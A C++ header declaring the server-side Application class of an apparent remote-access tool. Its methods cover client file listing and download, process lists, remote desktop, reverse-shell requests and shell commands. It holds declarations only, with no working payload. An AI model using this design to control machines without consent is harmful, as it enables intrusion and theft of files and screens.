#pragma once
#include "../shared/NetLib/packets/packetdefs.h"
#include "models/CommandLineArguments.h"
#include "../shared/NetLib/packets/PacketShell.h"
#include <vector>

class Client;
class SimpleConsoleUiMediator;
class NetServerService;
class Thread;
class Process;
struct FileInfo;

class Application
{
public:
	Application(const CommandLineArguments& cmd);
	~Application();
	void startServerAsync();

	void startUi();
	void startNetSubsystem();
	void startUiSubsystem();
	void run();

	void onFileDownloaded(Client* client, char* fileBytes, size_t fileSize);
	bool canInteractWith(unsigned long long clientId, bool checkedExistence = true);
	void onClientConnected(Client* client) const;
	void onDesktopImageReceived(Client* client, char* imageBytes, size_t imageSize) const;
	void onProcessListReceived(Client* client, std::vector<Process>* processes) const;
	void onFsRootsReceived(Client* client, const std::vector<FileInfo>& roots) const;
	void onFsFilesReceived(Client* client, const std::wstring& path, const std::vector<FileInfo>& files) const;
	Client* getClient(unsigned long long clientId) const;
	void requestProcessList(Client* client) const;
	std::vector<Client*> getClients() const;
	void listFiles(Client* client, const std::wstring& path);
	void downloadFile(Client* client, const std::wstring& path);
	void startRemoteDesktop(Client* client) const;
	void onServerStatusChanged(const char* str) const;
	void onServerError(const std::string& message);
	void onClientDisconnected(Client* client);
	void requestReverseShell(Client* client) const;
	void sendShellCommand(Client* client, char* instruction) const;
	void onShellResult(Client* client, PacketShellAction action, const std::string& data) const;

	CommandLineArguments cli;
	SimpleConsoleUiMediator* uiMediator;
	
	bool running;

	NetServerService* netServerService;
	Thread* serverThread;
};
